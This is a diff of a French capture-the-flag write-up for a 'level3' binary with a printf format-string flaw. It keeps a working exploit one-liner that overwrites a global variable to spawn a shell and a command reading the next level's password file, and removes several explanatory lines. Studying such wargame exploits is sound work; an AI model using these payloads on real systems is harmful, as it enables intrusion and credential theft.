@@ -21,10 +21,7 @@ But : écrire 64 (0x40) dans la variable globale `m` pour déclencher `system("/
 
 ## Analyse avec Ghidra
 
-1. Ouvrir le binaire `level3` dans Ghidra
-2. Aller dans la fonction `v`
-3. Cliquer sur la variable `m` dans le code décompilé → noter son adresse : `0x0804988c`
-4. Le code vulnérable :
+Le code vulnérable :
 ```c
 fgets(local_20c, 0x200, stdin);
 printf(local_20c);          // ← format string vulnerability
@@ -67,25 +64,8 @@ Astuce : `%60c` évite de taper 60 fois "A".
 (printf '\x8c\x98\x04\x08%%60x%%4$n'; cat) | ./level3
 ```
 
-Le `cat` (sans argument) lit le clavier et le recopie dans le tuyau, donc on peut
-taper des commandes après le `system("/bin/sh")`. Sinon le tuyau se ferme dès que
-python finit et le shell se ferme tout de suite.
-Attention : il faut un truc qui transmet le clavier (`cat`), pas juste une commande
-qui bloque (`sleep` garderait le shell vivant mais on pourrait pas lui parler).
-
-Variante équivalente : écrire le payload dans un fichier puis le rejouer avec `cat -` :
-```bash
-python -c 'print "\x8c\x98\x04\x08%60c%4$n"' > /tmp/payload
-cat /tmp/payload - | ./level3
-```
-`cat /tmp/payload -` = envoie d'abord le fichier (l'exploit), puis le `-` continue
-avec le clavier. L'ordre compte : le fichier avant le `-`.
-
-Quand ça marche, `Wait what?!` s'affiche (= m vaut bien 64).
-
 ## Récupérer le flag
 
 ```bash
 /bin/cat /home/user/level4/.pass
 ```
-(chemin complet car `cat` tout seul n'est pas trouvé dans ce shell)
